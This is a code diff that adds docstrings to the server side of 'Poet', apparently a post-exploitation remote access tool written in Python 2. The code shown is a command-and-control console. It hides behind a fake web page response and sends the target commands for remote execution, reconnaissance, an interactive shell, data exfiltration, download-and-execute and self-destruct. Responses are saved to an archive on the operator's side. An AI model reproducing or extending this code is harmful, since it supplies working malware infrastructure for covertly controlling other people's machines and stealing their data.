@@ -25,21 +25,25 @@ body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvet
 
 
 class PoetSocket():
-    """Socket wrapper for data transfer."""
+    """Socket wrapper for client/server communications.
 
-    def __init__(self, socket):
-        self.s = socket
+    Attributes:
+        s: socket instance
+
+    Socket abstraction which uses the convention that the message is prefixed
+    by a big-endian 32 bit value indicating the length of the following base64
+    string.
+    """
+
+    def __init__(self, s):
+        self.s = s
 
     def exchange(self, msg):
         self.send(msg)
         return self.recv()
 
     def send(self, msg):
-        """
-            Sends message using socket operating under the convention that the
-            message is prefixed by a big-endian 32 bit value indicating the
-            length of the following base64 string.
-        """
+        """Send message over socket."""
 
         pkg = base64.b64encode(msg)
         pkg_size = struct.pack('>i', len(pkg))
@@ -48,16 +52,10 @@ class PoetSocket():
             raise socket.error('socket connection broken')
 
     def recv(self):
-        """
-            Receives message from socket operating under the convention that
-            the message is prefixed by a big-endian 32 bit value indicating the
-            length of the following base64 string.
+        """Receive message from socket.
 
-            Returns the message.
-
-            TODO: Under high network loads, it's possible that the initial recv
-            may not even return the first 9 bytes so another loop is necessary
-            to ascertain that.
+        Returns:
+            The message sent from client.
         """
 
         chunks = []
@@ -100,14 +98,25 @@ class PoetSocketServer(PoetSocket):
 
 
 class PoetServer(object):
-    def __init__(self, s, port):
+    """Core server functionality.
+
+    Implements psh, and necessary helper functions.
+
+    Attributes:
+        s: socket instance for initial client connection
+        conn: socket instance for actual client communication
+        cmds: list of supported psh commands
+    """
+
+    def __init__(self, s):
         self.s = s
-        self.port = port
         self.conn = None
         self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
                      'selfdestruct', 'dlexec', 'chint']
 
     def psh(self):
+        """Poet server control shell."""
+
         print '[+] ({}) Entering control shell'.format(datetime.now())
         self.conn = PoetSocket(self.s.accept()[0])
         prompt = self.conn.exchange('getprompt')
@@ -212,6 +221,14 @@ class PoetServer(object):
         print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
     def generic(self, req, write_flag=False, write_file=None):
+        """Abstraction layer for exchanging with client and writing to file.
+
+        Args:
+            reg: command to send to client
+            write_flag: whether client response should be written
+            write_file: optional filename to use for file
+        """
+
         resp = self.conn.exchange(req)
         if req == self.cmds[3]:
             resp = zlib.decompress(resp)
@@ -220,6 +237,16 @@ class PoetServer(object):
             self.write(resp, req.split()[0], OUT, write_file)
 
     def write(self, response, prefix, out_dir, write_file=None):
+        """Write to server archive.
+
+        Args:
+            response: data to write
+            prefix: directory to write file to (usually named after command
+                    executed)
+            out_dir: name of server archive directory
+            write_file: optional filename to use for file
+        """
+
         ts = datetime.now().strftime('%Y%m%d%M%S')
         out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
         out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
@@ -240,6 +267,8 @@ class PoetServer(object):
             print 'psh : {} written to {}'.format(prefix, outfile)
 
     def cmd_help(self, ind):
+        """Print help messages for psh commands."""
+
         if ind == 2:
             print 'Execute commands on target.'
             print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
@@ -286,6 +315,15 @@ class PoetServer(object):
             print '-h\t\tshow help'
 
     def exec_preproc(self, inp):
+        """Parse psh `exec' command line.
+
+        Args:
+            inp: raw `exec' command line
+
+        Returns:
+            Tuple suitable for expansion into as self.generic() parameters.
+        """
+
         tmp = inp.split()
         write_file = None
         write_flag = tmp[1] == '-o'
@@ -298,7 +336,12 @@ class PoetServer(object):
         return tmp, write_flag, write_file
 
     def shell(self, prompt):
-        pass
+        """Psh `shell' command implementation.
+
+        Args:
+            prompt: shell prompt to use
+        """
+
         while True:
             try:
                 inp = raw_input(PSH_PROMPT + prompt)
@@ -338,7 +381,7 @@ def main():
         conn.send(FAKEOK)
         conn.close()
         try:
-            PoetServer(s, PORT).psh()
+            PoetServer(s).psh()
         except socket.error as e:
             print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
             print '[-] ({}) Poet terminated.'.format(datetime.now())
